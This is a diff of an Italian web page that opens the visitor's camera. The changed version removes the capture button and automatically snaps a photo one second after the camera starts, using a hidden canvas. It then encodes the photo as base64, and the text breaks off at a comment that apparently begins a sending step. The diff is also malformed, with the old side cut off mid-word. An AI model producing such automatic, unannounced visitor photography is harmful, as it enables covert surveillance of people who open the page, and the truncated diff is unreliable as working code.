@@ -1,27 +1,45 @@
 <!DOCTYPE html>
 <html lang="it">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Scatta una Foto</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Scatta una foto!</title>
 </head>
 <body>
-  <h1>Scatta una Foto!</h1>
-  <video id="video" width="320" height="240" autoplay></video>
-  <canvas id="canvas" style="display:none;"></canvas>
-  <button id="capture" style="display:none;">Scatta Foto</button>
-  
-  <script>
-    // Accesso alla fotocamera
-    const video = document.getElementById('video');
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(function(stream) {
-        video.srcObject = stream;
+    <h1>Scatta una foto!</h1>
 
-        // Foto scattata appena il video è pronto
-        video.oncanplay = function() {
-          takePicture(); // Scatta la foto appena possibile
-        };
-      })
-      .catch(function(error) {
-        console.erro
+    <video id="video" width="320" height="240" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <script>
+        // Accedi alla fotocamera del dispositivo
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                var video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // Imposta un timer che scatta la foto appena la pagina è caricata
+                setTimeout(function() {
+                    scattaFoto();
+                }, 1000); // Foto scattata dopo 1 secondo
+            })
+            .catch(function(error) {
+                console.log("Errore nell'accesso alla fotocamera: ", error);
+            });
+
+        // Funzione per scattare la foto
+        function scattaFoto() {
+            var video = document.getElementById('video');
+            var canvas = document.getElementById('canvas');
+            var context = canvas.getContext('2d');
+
+            // Imposta le dimensioni del canvas uguali a quelle del video
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Disegna il fotogramma video sul canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Converte l'immagine in formato base64
+            var fotoBase64 = canvas.toDataURL('image/png');
+
+            // Inv
